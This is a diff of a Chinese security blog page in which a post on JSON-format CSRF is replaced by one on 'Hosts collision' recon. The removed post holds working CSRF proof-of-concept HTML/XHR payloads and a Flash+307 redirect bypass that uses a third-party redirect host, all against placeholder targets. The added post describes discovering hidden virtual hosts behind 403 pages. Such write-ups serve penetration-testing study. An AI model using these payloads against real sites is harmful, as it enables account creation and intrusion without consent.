@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="CSRF," />
+  <meta name="keywords" content="Tips," />
 
 
 
@@ -79,19 +79,21 @@
 
 
 
-<meta name="description" content="Json格式的CSRF有这样一个场景，新增用户不校验Referer，没有token，马上可以想到CSRF漏洞。但它又有一些不同的是它提交的数据是Json格式的，请求包类似： POST &#x2F;api&#x2F;add HTTP&#x2F;1.1 Host: target.com User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko&#x2F;">
-<meta name="keywords" content="CSRF">
+<meta name="description" content="看了R3start师傅的分享，学到了一个新的姿势-Hosts碰撞。 场景项目第一阶段，我们通过各种方法进行信息收集： 11. 目标主业务二级域名、三级域名等…多级域名收集2✓ 通过FOFA语法收集3✓ 通过子域名爆破、反查收集4✓ 通过JS接口收集5✓ 通过Github信息泄露6✓ …72. 业务强关联子公司资产收集8✓ 多级域名资产9✓ Github信息泄露10✓ 员工信息、管理后台11✓ …1">
+<meta name="keywords" content="Tips">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Json格式的CSRF">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;07&#x2F;08&#x2F;Json%E6%A0%BC%E5%BC%8F%E7%9A%84CSRF&#x2F;index.html">
+<meta property="og:title" content="边界渗透技巧之Hosts碰撞">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;%E8%BE%B9%E7%95%8C%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8BHosts%E7%A2%B0%E6%92%9E&#x2F;index.html">
 <meta property="og:site_name" content="Sharp_T&#39;s Blog">
-<meta property="og:description" content="Json格式的CSRF有这样一个场景，新增用户不校验Referer，没有token，马上可以想到CSRF漏洞。但它又有一些不同的是它提交的数据是Json格式的，请求包类似： POST &#x2F;api&#x2F;add HTTP&#x2F;1.1 Host: target.com User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko&#x2F;">
+<meta property="og:description" content="看了R3start师傅的分享，学到了一个新的姿势-Hosts碰撞。 场景项目第一阶段，我们通过各种方法进行信息收集： 11. 目标主业务二级域名、三级域名等…多级域名收集2✓ 通过FOFA语法收集3✓ 通过子域名爆破、反查收集4✓ 通过JS接口收集5✓ 通过Github信息泄露6✓ …72. 业务强关联子公司资产收集8✓ 多级域名资产9✓ Github信息泄露10✓ 员工信息、管理后台11✓ …1">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https:&#x2F;&#x2F;ftp.bmp.ovh&#x2F;imgs&#x2F;2019&#x2F;11&#x2F;6f3ba4b5502fe8ae.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;23f70022bab710a4.png">
-<meta property="og:updated_time" content="2020-03-16T07:32:34.242Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;d385fecdd0776666.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;60aa799424fe0dcd.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;523f7a9e64d5ec9e.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;01d712c32c4c4660.png">
+<meta property="og:updated_time" content="2020-03-23T09:45:01.506Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;ftp.bmp.ovh&#x2F;imgs&#x2F;2019&#x2F;11&#x2F;6f3ba4b5502fe8ae.png">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;d385fecdd0776666.png">
 
 
 
@@ -121,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/07/08/Json格式的CSRF/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/12/02/边界渗透技巧之Hosts碰撞/"/>
 
 
 
 
 
-  <title>Json格式的CSRF | Sharp_T's Blog</title>
+  <title>边界渗透技巧之Hosts碰撞 | Sharp_T's Blog</title>
   
 
 
@@ -254,7 +256,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/08/Json%E6%A0%BC%E5%BC%8F%E7%9A%84CSRF/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/02/%E8%BE%B9%E7%95%8C%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8BHosts%E7%A2%B0%E6%92%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Sharp_T">
@@ -271,7 +273,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Json格式的CSRF</h1>
+          <h1 class="post-title" itemprop="name headline">边界渗透技巧之Hosts碰撞</h1>
         
 
         <div class="post-meta">
@@ -283,8 +285,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-08T14:29:24+08:00">
-                2019-07-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-02T21:30:18+08:00">
+                2019-12-02
               </time>
             
 
@@ -343,73 +345,22 @@
       
 
       
-        <h2 id="Json格式的CSRF"><a href="#Json格式的CSRF" class="headerlink" title="Json格式的CSRF"></a>Json格式的CSRF</h2><p>有这样一个场景，新增用户不校验Referer，没有token，马上可以想到CSRF漏洞。但它又有一些不同的是它提交的数据是Json格式的，请求包类似：</p>
-<pre><code>POST /api/add HTTP/1.1
-Host: target.com
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
-Accept: application/json
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: application/json
-x-requested-with: XMLHttpRequest
-Content-Length: 124
-Origin: https://target.com
-Connection: close
-Referer: https://target.com/account/unitivesubacct/add?service=erp&amp;bg_source=7&amp;part_type=1&amp;feconfig=erp.chains
-Cookie: abcdefg
+        <p>看了R3start师傅的分享，学到了一个新的姿势-Hosts碰撞。</p>
+<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>项目第一阶段，我们通过各种方法进行信息收集：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1. 目标主业务二级域名、三级域名等…多级域名收集</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">✓ 通过FOFA语法收集</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">✓ 通过子域名爆破、反查收集</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">✓ 通过JS接口收集</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">✓ 通过Github信息泄露</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">✓ …</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">2. 业务强关联子公司资产收集</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">✓ 多级域名资产</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">✓ Github信息泄露</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">✓ 员工信息、管理后台</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">✓ …</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">3. 目标IP资产、内网域名收集</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">✓ 线上测试环境</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">✓ Github信息泄露</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">✓ 历史漏洞信息</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">✓ JS代码</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">✓ …</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">4. …</span></pre></td></tr></table></figure>
 
-{&quot;login&quot;:&quot;admin1&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;mobile&quot;:&quot;13000000000&quot;,&quot;intercode&quot;:&quot;86&quot;,&quot;name&quot;:&quot;&quot;,&quot;requestCode&quot;:&quot;&quot;,&quot;responseCode&quot;:&quot;&quot;}</code></pre><p>POST提交的不是表单，而是Json数组，如果我们直接使用burp生成poc，生成的是以表单形式提交的，类似：</p>
-<p><img src="https://ftp.bmp.ovh/imgs/2019/11/6f3ba4b5502fe8ae.png" alt=""></p>
-<p>直接使用这个poc会出现一个问题，post数据包会多了一个”=”：</p>
-<pre><code>`{&quot;login&quot;:&quot;admin1&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;mobile&quot;:&quot;13000000000&quot;,&quot;intercode&quot;:&quot;86&quot;,&quot;name&quot;:&quot;&quot;,&quot;requestCode&quot;:&quot;&quot;,&quot;responseCode&quot;:&quot;&quot;}=`</code></pre><h2 id="补全Json格式"><a href="#补全Json格式" class="headerlink" title="补全Json格式"></a>补全Json格式</h2><p>这个=就导致服务端的Json解析器解析不了，然后报错。<br>这种情况下，我们可以以给value赋值从而对这个“=”后面的数据进行补全，使得其构成一个完整的JSON格式，可避免解析器报错:</p>
-<pre><code>&lt;html&gt;  
-&lt;form action=&quot;http://target.com/api/add&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;  
-&lt;input name=&apos;{&quot;login&quot;:&quot;admin1&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;mobile&quot;:&quot;13000000000&quot;,&quot;intercode&quot;:&quot;86&quot;,&quot;name&quot;:&quot;&quot;,&quot;requestCode&quot;:&quot;&quot;,&quot;responseCode&quot;:&quot;&quot;, &quot;&quot;:&quot;&apos; value=&apos;test&quot;}&apos;type=&apos;hidden&apos;&gt;  
-&lt;input type=submit&gt;  
-&lt;/form&gt;  
-&lt;/html&gt; </code></pre><p>这样POST的数据就变成一个正确的Json格式了，可能可以避免报错。</p>
-<pre><code>{&quot;login&quot;:&quot;admin1&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;mobile&quot;:&quot;13000000000&quot;,&quot;intercode&quot;:&quot;86&quot;,&quot;name&quot;:&quot;&quot;,&quot;requestCode&quot;:&quot;&quot;,&quot;responseCode&quot;:&quot;&quot;,&quot;&quot;:&quot;=&quot;}</code></pre><h2 id="设置Content-Type"><a href="#设置Content-Type" class="headerlink" title="设置Content-Type"></a>设置Content-Type</h2><p>但是这里还有一个问题，在原始的数据包里Content-Type的值是application/json，而以form去提交是没法设置application/json的，在这里设置为text/plain。<br>如果服务器对Content-Type有校验，这里就会报错。所以需要将Content-Type设为application/json。<br>这里可以使用XHR实现，poc类似：</p>
-<pre><code>&lt;html&gt;
-  &lt;body&gt;
-    &lt;script&gt;
-      function submitRequest()
-      {
-        var xhr = new XMLHttpRequest();
-        xhr.open(&quot;POST&quot;, &quot;http://target.com/api/add&quot;, true);
-        xhr.setRequestHeader(&quot;Accept&quot;, &quot;*/*&quot;);
-        xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;);
-        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json; charset=utf-8&quot;);
-        xhr.withCredentials = true;
-        xhr.send(JSON.stringify({&quot;login&quot;:&quot;admin1&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;mobile&quot;:&quot;13000000000&quot;,&quot;intercode&quot;:&quot;86&quot;,&quot;name&quot;:&quot;&quot;,&quot;requestCode&quot;:&quot;&quot;,&quot;responseCode&quot;:&quot;&quot;});
-    }
-    &lt;/script&gt;
-    &lt;form action=&quot;#&quot;&gt;
-      &lt;input type=&quot;button&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot;/&gt;
-    &lt;/form&gt;
-  &lt;/body&gt;
-&lt;/html&gt;</code></pre><p>但是这种方法会先进行一次OPTIONS预请求：</p>
-<pre><code>OPTIONS /api/add HTTP/1.1
-Host: target.com
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
-Accept: */*
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Access-Control-Request-Method: POST
-Access-Control-Request-Headers: content-type
-Origin: null
-Connection: close</code></pre><p>如果服务器并未设置允许任意域名跨域请求，就会拒绝options预请求。</p>
-<h2 id="Flash-307跳转"><a href="#Flash-307跳转" class="headerlink" title="Flash+307跳转"></a>Flash+307跳转</h2><p>这里可以使用Flash+307跳转绕过（但是该方法在2018年之后版本的浏览器应该都不行了）</p>
-<p>需要环境如下：</p>
-<ul>
-<li>能发起HTTP请求的swf文件(csrf_json.swf)</li>
-<li>307跳转(307.php)</li>
-<li>上面两个文件同域</li>
-</ul>
-<p>参考：<a href="https://github.com/sp1d3r/swf_json_csrf" target="_blank" rel="noopener">https://github.com/sp1d3r/swf_json_csrf</a></p>
-<p>使用1lastBr3ath提供的测试POC进行测试：</p>
-<p><a href="http://cm2.pw/crossdomain" target="_blank" rel="noopener">http://cm2.pw/crossdomain</a></p>
-<p>POC:</p>
-<pre><code>http://cm2.pw/redirect?url=http://xxxxtarget.com/add&amp;status=307</code></pre><p><img src="https://i.bmp.ovh/imgs/2020/03/23f70022bab710a4.png" alt=""></p>
+<p>但是收集到的资产很多都访问不了：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/d385fecdd0776666.png" alt=""></p>
+<p>其实很多时候这些IP、域名往往都是一些脆弱的、高价值的又容易被突破的站点，但大部分人看到这些响应码后的操作最多也就扫扫端口、扫扫目录有发现就继续搞搞，没发现就丢掉，从而错失了打入内网的大好机会。</p>
+<h2 id="Hosts碰撞"><a href="#Hosts碰撞" class="headerlink" title="Hosts碰撞"></a>Hosts碰撞</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>如果管理员在配置apache或nginx的时候禁止了IP访问，那么我们直接访问IP将会回显403页面：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/60aa799424fe0dcd.png" alt=""></p>
+<p>这时候访问网站则需要使用Apache的httpd.conf配置中的ServerName里指定的值才能够正常访问：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/523f7a9e64d5ec9e.png" alt=""></p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p><a href="https://github.com/baimaohui-net/Hosts_scan" target="_blank" rel="noopener">https://github.com/baimaohui-net/Hosts_scan</a></p>
+<p>在发送http请求的时候，对域名和IP列表进行配对，然后遍历发送请求（就相当于修改了本地的hosts文件一样），并把相应的title和响应包大小拿回来做对比，即可快速发现一些隐蔽的资产：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/01d712c32c4c4660.png" alt=""></p>
+<p>参考链接：</p>
+<p><a href="http://r3start.net/index.php/2019/01/10/372" target="_blank" rel="noopener">http://r3start.net/index.php/2019/01/10/372</a><br><a href="https://github.com/baimaohui-net/Hosts_scan" target="_blank" rel="noopener">https://github.com/baimaohui-net/Hosts_scan</a></p>
 
       
     </div>
@@ -427,7 +378,7 @@ Connection: close</code></pre><p>如果服务器并未设置允许任意域名�
       
         <div class="post-tags">
           
-            <a href="/tags/CSRF/" rel="tag"># CSRF</a>
+            <a href="/tags/Tips/" rel="tag"># Tips</a>
           
         </div>
       
@@ -440,8 +391,8 @@ Connection: close</code></pre><p>如果服务器并未设置允许任意域名�
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/06/08/hello-world/" rel="next" title="Hello World">
-                <i class="fa fa-chevron-left"></i> Hello World
+              <a href="/2019/11/08/%E4%B8%A4%E7%A7%8D%E9%B8%A1%E8%82%8B%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/" rel="next" title="两种鸡肋的提权方法">
+                <i class="fa fa-chevron-left"></i> 两种鸡肋的提权方法
               </a>
             
           </div>
@@ -450,8 +401,8 @@ Connection: close</code></pre><p>如果服务器并未设置允许任意域名�
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/07/26/%E5%BD%93CSRF%E9%81%87%E4%B8%8AX-Requested-With/" rel="prev" title="当CSRF遇上X-Requested-With">
-                当CSRF遇上X-Requested-With <i class="fa fa-chevron-right"></i>
+              <a href="/2019/12/31/Web%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/" rel="prev" title="Web模糊测试之道">
+                Web模糊测试之道 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -602,7 +553,7 @@ Connection: close</code></pre><p>如果服务器并未设置允许任意域名�
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Json格式的CSRF"><span class="nav-number">1.</span> <span class="nav-text">Json格式的CSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#补全Json格式"><span class="nav-number">2.</span> <span class="nav-text">补全Json格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#设置Content-Type"><span class="nav-number">3.</span> <span class="nav-text">设置Content-Type</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flash-307跳转"><span class="nav-number">4.</span> <span class="nav-text">Flash+307跳转</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#场景"><span class="nav-number">1.</span> <span class="nav-text">场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hosts碰撞"><span class="nav-number">2.</span> <span class="nav-text">Hosts碰撞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理"><span class="nav-number">2.0.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用"><span class="nav-number">2.0.2.</span> <span class="nav-text">利用</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
